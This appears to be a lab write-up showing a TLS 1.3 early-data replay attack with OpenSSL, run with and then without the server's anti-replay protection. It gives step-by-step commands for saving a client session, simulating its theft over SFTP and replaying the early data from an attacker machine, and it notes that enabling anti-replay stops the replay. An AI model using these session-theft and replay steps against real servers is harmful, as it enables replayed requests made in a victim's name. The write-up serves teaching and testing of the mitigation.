# Early Data Attack

## Early Data without anti-replay protection

In this case we enable support for early data mode on the server but we deactivate the anti-replay protection mode that is enabled by default by OpenSSL.

Start the server to accept early data:
```
openssl s_server -accept 4433 -cert server.crt -key server.key -tls1_3 -early_data -no_anti_replay
```
The option `-early_data` enables the server to accept early data.
The option `-no_anti_replay` deactivates the anti-replay protection.

Start Wireshark on the attacker side:
```
sudo wireshark
```

Start the client and save the session:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_out sess.bin
```
The `-sess_out` option specifies a file in which to save the TLS session.

Close the communication using `CTRL-D`.

Client sends early data resumpting the connection:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_in sess.bin -early_data early.txt
```
In this case `-early_data` is useful to specify a file that contains data to send as early data.
The option `-sess_in` is used to import a TLS session file.

Close the communication using `CTRL-D`.

To simulate the attacker stealing the client's session, we can establish a connection using the SFTP protocol, a protocol that allows file transfers between hosts.  
On the attacker machine, use the following command:
```
sftp <client_name>@<client_ip>
```

Then navigate to the directory containing the files `sess.bin` and `early.txt` and download them:
```
cd <path_to_repository>
get sess.bin 
get early.txt
bye
```

The attacker can now send early data to the server using the client's same session multiple times:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_in sess.bin -early_data early.txt
```
Run the command again to verify that the server does not reject the message.


## Early Data with anti-replay protection

In this case, along with enabling early data support, we also enable anti-replay protection.
As in the previous case, we make the same assumptions: the attacker obtains the session and the data to be sent as early data.

In ordert to work, you need to delete the file `sess.bin` of the previous case in order to generate a new session.

Start the server to accept early data:
```
openssl s_server -accept 4433 -cert server.crt -key server.key -tls1_3 -early_data
```

Start the client and save the session:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_out sess.bin
```

Close the communication using `CTRL-D`.

Start Wireshark on the attacker side:
```
sudo wireshark
```

With the client, connect to server and the send early data:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_in sess.bin -early_data early.txt
```

Close the communication using `CTRL-D`.

Simulate the theft of the session using SFTP with the attacker:
```
sftp <client_name>@<client_ip>
```

Then navigate to the directory containing the files `sess.bin` and `early.txt` and download them:
```
cd <path_to_repository>
get sess.bin 
get early.txt
bye
```

The attacker can now use the client's session to send early data to the server:
```
openssl s_client -connect <ip_server>:4433 -tls1_3 -sess_in sess.bin -early_data early.txt
```


## Results

In the case without anti-replay protection, we can observe from the server log that we can send multiple early data messages and the server will accept them all, displaying the phrase "Early data received", thus demonstrating the vulnerability if an attacker manages to exploit the client’s session. 
In Wireshark we can see that, in the resumption phase carried out by the attacker, that the ClientHello contains two extensions: early_data, that simply notifies the server that is going to send early data; pre_shared_key, that contains the field PSK Identity that contains the Pre Shared Key (PSK) of the session. We can observe that the PSK used by the client and the attacker is the same. Together with the ClientHello, an Application Data message is sent after the Change Cipher Spec, and contains the early data.

If we enable anti-replay protection, we can observe that the early data is accepted only the first time, when the client sends it. When the attacker tries to reuse the same session, we can see in the server log the message "Early data was rejected", i.e. any attempt to resend early data will be refused. In Wireshark we can also notice that the attacker continues to send the early data together with the ClientHello; the behavior remains the same as before because the rejection happens on the server side after it receives the message.






